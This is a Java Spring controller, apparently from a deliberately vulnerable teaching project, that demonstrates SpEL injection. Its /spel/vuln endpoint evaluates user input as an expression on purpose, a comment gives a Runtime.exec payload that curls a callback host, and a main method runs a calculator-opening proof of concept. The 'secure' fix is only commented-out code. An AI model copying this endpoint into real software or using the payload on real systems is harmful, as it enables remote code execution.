package org.joychou.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
//import org.springframework.expression.spel.support.SimpleEvaluationContext;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SPEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        return parser.parseExpression(expression).getValue().toString();
    }

    @GetMapping("/spel/sec")
    public String sec(String expression) {
        // SimpleEvaluationContext was added in 4.3.15.RELEASE so the fact you can't find it in 4.3.14.RELEASE is perfectly normal.
        // ExpressionParser parser = new SimpleEvaluationContext();
        // fix method: SimpleEvaluationContext
        // return parser.parseExpression(expression).getValue().toString();
        return "test";
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

